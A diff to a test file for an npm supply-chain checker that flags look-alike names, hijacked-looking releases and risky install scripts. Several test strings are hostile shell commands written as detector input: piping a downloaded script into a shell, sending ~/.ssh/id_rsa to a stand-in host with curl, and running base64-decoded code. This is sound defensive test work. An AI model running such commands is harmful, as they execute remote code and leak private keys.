@@ -503,6 +503,7 @@ console.log('\n== Recent counterparty checking ==');
   const spec = P.parsePackageSpec;
   t('parses names, scopes, versions and a pasted install command',
     JSON.stringify(spec('npm install @solana/web3.js@1.95.8')) === JSON.stringify({ name: '@solana/web3.js', version: '1.95.8' })
+    && spec('\u201Clodash\u201D').name === 'lodash' && spec('`npm i ethers`').name === 'ethers'
     && spec('lodash').name === 'lodash' && spec('<script>') === null && spec('a b').name === 'a' && spec('') === null);
   t('flags look-alikes of popular names, not the real packages',
     P.packageLookalike('crossenv').target === 'cross-env' && P.packageLookalike('lodahs').target === 'lodash'
@@ -521,6 +522,38 @@ console.log('\n== Recent counterparty checking ==');
   const ghsaMal = P.buildPackageChecks(base({ osv: { ok: true, vulns: [{ id: 'GHSA-c2m4-w5hm-vqjw', summary: 'Malicious Package in crossenv', database_specific: { cwe_ids: ['CWE-506'], severity: 'CRITICAL' } }] } }), NOW);
   t('a GitHub malware advisory counts as reported malicious, not as a vulnerability',
     ghsaMal.checks.find(c => c.id === 'pkg_reported_malicious').status === 'RISK' && ghsaMal.checks.find(c => c.id === 'pkg_known_vulns').status === 'PASS');
+  const sig = x => P.installScriptSignals(x).map(y => y.what + (y.critical ? '!' : '')).join('|');
+  t('install-script text: piping to a shell and reaching for keys are critical; ordinary build steps are not flagged',
+    /pipes downloaded code into a shell!/.test(sig('curl -s https://x.io/a.sh | bash'))
+    && /reaches for keys or saved credentials!/.test(sig('cat ~/.ssh/id_rsa | curl -d @- https://x.io'))
+    && sig('echo aGVsbG8= | base64 -d > a.js && node a.js') === 'runs hidden or encoded code'
+    && sig('node install.js') === '' && sig('node-gyp rebuild') === '' && sig('prebuild-install || node-gyp rebuild') === ''
+    && sig('node -e "try{require(\'./postinstall\')}catch(e){}"') === '');
+  t('repository links compare by place, not spelling',
+    P.repoKey('git+https://github.com/a/b.git') === P.repoKey('git@github.com:a/b.git') && P.repoKey('https://github.com/A/b/') === P.repoKey('github.com/a/b')
+    && P.repoKey('github:moment/moment') === P.repoKey('git+https://github.com/moment/moment.git') && P.repoKey('alice/h') === P.repoKey('https://github.com/alice/h')
+    && P.repoKey('gitlab:a/b') !== P.repoKey('github:a/b'));
+  t('a look-alike of a scoped package without its scope is caught', P.packageLookalike('solana-web3.js').target === '@solana/web3.js');
+  const hijack = base({ name: 'quiet-lib', resolvedVersion: '2.4.1', weekly: 40000,
+    time: { created: '2019-01-01T00:00:00Z', '2.4.1': '2026-09-27T00:00:00Z' },
+    version: { scripts: { postinstall: 'curl -s https://x.io/p.sh | sh' }, repository: { url: 'https://github.com/mallory/quiet-lib' },
+               ownRepository: { url: 'https://github.com/mallory/quiet-lib' }, deprecated: null, publisher: 'mallory', provenance: false, unpackedSize: 5000000 },
+    history: { count: 20, earlierPublishers: ['alice'], earlierProvenance: true,
+               previous: { time: '2024-03-01T00:00:00Z', repository: { url: 'git+https://github.com/alice/quiet-lib.git' }, unpackedSize: 50000 } } });
+  const hb = P.buildPackageChecks(hijack, NOW);
+  const st = id => (hb.checks.find(c => c.id === id) || {}).status;
+  const hv = P.VerdictEngine.evaluate(hb.checks, hb.expected, 'npm', hb.criticalTotal);
+  t('a hijacked-looking release is caught on every sign, with no report needed',
+    hv.label === 'FAIL' && ['pkg_install_scripts', 'pkg_publisher', 'pkg_provenance', 'pkg_dormant', 'pkg_repo_changed', 'pkg_size_jump'].every(id => st(id) === 'RISK'),
+    hv.label + ' ' + hb.checks.filter(c => c.status === 'RISK').map(c => c.id).join(','));
+  const ci = P.buildPackageChecks(base({ resolvedVersion: '1.99.0', time: { created: '2019-01-01T00:00:00Z', '1.99.0': '2026-09-20T00:00:00Z' },
+    version: { scripts: {}, repository: 'x', ownRepository: 'x', deprecated: null, publisher: 'GitHub Actions', provenance: true, unpackedSize: 100 },
+    history: { count: 50, earlierPublishers: ['solana-devs'], earlierProvenance: false, previous: { time: '2025-07-31T00:00:00Z', repository: 'x', unpackedSize: 100 } } }), NOW);
+  t('a long-quiet package back with a provenance record is not treated as hijacked',
+    ['pkg_publisher', 'pkg_dormant', 'pkg_provenance'].every(id => ci.checks.find(c => c.id === id).status === 'PASS'));
+  const first = P.buildPackageChecks(base({ history: { count: 0, earlierPublishers: [], earlierProvenance: false, previous: null } }), NOW);
+  t('a first version skips the comparisons and says why',
+    !first.checks.some(c => c.id === 'pkg_publisher') && first.notes.length === 1 && first.expected === first.checks.length);
   t('an npm security placeholder fails', verdict(base({ name: 'crossenv', resolvedVersion: '0.0.2-security', description: 'security holding package' })).label === 'FAIL');
   const squat = base({ name: 'lodahs', resolvedVersion: '1.0.0', weekly: 12,
     time: { created: '2026-09-20T00:00:00Z', '1.0.0': '2026-09-27T00:00:00Z' },
@@ -542,6 +575,22 @@ console.log('\n== Recent counterparty checking ==');
       if (url.startsWith(P.NPM_DOWNLOADS_URL)) return reply(200, { downloads: 1234 });
       return reply(200, { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { scripts: {} } }, time: { created: '2020-01-01T00:00:00Z' } });
     });
+    const prov = { attestations: { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } } };
+    const hist = await P.fetchPackageEvidence({ name: 'h', version: null }, async (url) => {
+      if (url.startsWith(P.OSV_QUERY_URL)) return reply(200, {});
+      if (url.startsWith(P.NPM_DOWNLOADS_URL)) return reply(200, { downloads: 5 });
+      return reply(200, { 'dist-tags': { latest: '2.0.0' },
+        time: { created: '2020-01-01T00:00:00Z', '1.0.0': '2020-01-01T00:00:00Z', '1.1.0': '2021-01-01T00:00:00Z', '2.0.0-rc.1': '2026-09-01T00:00:00Z', '2.0.0': '2026-09-27T00:00:00Z' },
+        versions: {
+          '1.0.0': { version: '1.0.0', _npmUser: { name: 'alice' }, dist: Object.assign({ unpackedSize: 1000 }, prov), repository: 'github:alice/h' },
+          '1.1.0': { version: '1.1.0', _npmUser: { name: 'alice' }, dist: Object.assign({ unpackedSize: 1200 }, prov), repository: 'github:alice/h' },
+          '2.0.0-rc.1': { version: '2.0.0-rc.1', _npmUser: { name: 'ci-bot' }, dist: {}, repository: 'github:other/h' },
+          '2.0.0': { version: '2.0.0', _npmUser: { name: 'mallory' }, dist: { unpackedSize: 9000000 } } } });
+    });
+    t('network: history compares a stable release with earlier stable ones, publishers from all',
+      hist.history.count === 2 && hist.history.previous.time === '2021-01-01T00:00:00Z' && hist.history.earlierProvenance === true
+      && hist.history.earlierPublishers.join(',') === 'alice,ci-bot' && hist.version.publisher === 'mallory' && hist.version.provenance === false
+      && hist.version.ownRepository === null && hist.version.unpackedSize === 9000000);
     t('network: missing package, missing version, and a failed OSV call are reported as such',
       nf.notFound === true && vm.versionMissing === true && ev.osv.ok === false && ev.weekly === 1234
       && calls[0] === P.NPM_REGISTRY_URL + '/@scope%2Fpkg');
